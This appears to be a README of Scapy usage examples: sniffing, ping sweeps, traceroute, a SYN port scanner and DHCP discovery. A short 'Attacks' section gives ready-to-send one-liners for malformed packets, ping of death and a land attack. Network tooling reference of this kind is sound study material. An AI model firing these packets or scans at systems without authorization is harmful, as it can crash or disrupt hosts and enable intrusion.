# uberscapy
Scapy docs, examples, scripts and other stuff

## Contents

docs - diffrent scapy docs

examples - examples for official Scapy usage and more


## Tutorial

Official Scapy usage tutorial is located [here](http://www.secdev.org/projects/scapy/doc/usage.html)

## Simple examples

### Sniff
 
Sniffing on eth0:
```python
    sniff(iface="eth0",prn=lambda x: x.summary())
    sniff(iface="eth0",prn=lambda x: x.show())
```
	
Formated sniff output
```python
    pkts = sniff(prn=lambda x:x.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}"))
```
	
Identify ports
```python
    a=sniff(filter="tcp and ( port 25 or port 110 )",
    prn=lambda x: x.sprintf("%IP.src%:%TCP.sport% -> %IP.dst%:%TCP.dport%  %2s,TCP.flags% : %TCP.payload%"))
```
 
### Ping

TCP ping:
```python
	srloop(IP(dst="www.google.com/30")/TCP())
```

TCP ping:
```python
    ans,unans=sr( IP(dst="192.168.1.*")/TCP(dport=80,flags="S") )
	ans.summary( lambda(s,r) : r.sprintf("%IP.src% conteasta") )
```
    
UDP ping
```python
    ans,unans=sr( IP(dst="192.168.1.1-10")/UDP(dport=0) )
	ans.summary( lambda(s,r) : r.sprintf("%IP.src% contesta en udp") )
```

ARP ping manual:
```python
	ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"),timeout=2)
	ans.summary(lambda (s,r): r.sprintf("%Ether.src% %ARP.psrc%") )
```

ARP ping built in:
```python
	arping("192.168.1.1")
```
    
Traceroute:
```python
	traceroute(["www.google.com","www.ust.cl","www.terra.cl","www.microsoft.com"],maxttl=20)
	result, unans=_
	result.show()
	# save output
	result.graph(type="ps", target="|lp")
	result.graph(target="> grafico.svg")
```

Advaced traceroute + DNS
```python
	ans,unans=sr(IP(dst="terra.cl",ttl=(1,10))/TCP(dport=53,flags="S"))
	ans.summary( lambda(s,r) : r.sprintf("%IP.src%\t{ICMP:%ICMP.type%}\t{TCP:%TCP.flags%}"))
```

Dump traceroute output:
```python
	res,unans = traceroute(["www.ust.cl","www.santotomas.cl"],dport=[80,443],maxttl=20,retry=-2)
	res.graph(type="ps", target="|lp")
	res.graph(target="> grafico.svg")
```

Port scanner:
```python
	res,unans = sr( IP(dst="target")/TCP(flags="S", dport=(1,1024)) )
	res.nsummary( lfilter=lambda (s,r): (r.haslayer(TCP) and (r.getlayer(TCP).flags & 2)) )
```

OS fingerprint:
```python
	ans,unans=srloop(IP(dst="192.168.1.1")/TCP(dport=80,flags="S"))
```

###	Attacks
	
Malformed packets:
	
```python
    send(IP(dst="192.168.1.1", ihl=2, version=3)/ICMP())
```
	
Ping of death:
```python
    send( fragment(IP(dst="192.168.1.1")/ICMP()/("X"*60000)) )
```

Land attack (windows):
```python
    send(IP(src=target,dst=target)/TCP(sport=135,dport=135))
```
 
DHCP discovery:
```python
	conf.checkIPaddr = False
	fam,hw = get_if_raw_hwaddr(conf.iface)
	dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=hw)/DHCP(options=[("message-type","discover"),"end"])
	ans, unans = srp(dhcp_discover, multi=True)
	ans.display()
```

## Links

http://stackoverflow.com/questions/10818661/scapy-retrieving-rssi-from-wifi-packets

http://hackoftheday.securitytube.net/2013/04/wi-fi-ssid-sniffer-in-12-lines-of.html

http://hackoftheday.securitytube.net/2013/03/wi-fi-sniffer-in-10-lines-of-python.html

http://scholarworks.sjsu.edu/cgi/viewcontent.cgi?article=1191&context=etd_projects

http://pen-testing.sans.org/blog/2011/10/13/special-request-wireless-client-sniffing-with-scapy

http://raidersec.blogspot.com/2013/01/wireless-deauth-attack-using-aireplay.html

http://www.secdev.org/projects/scapy/portability.html
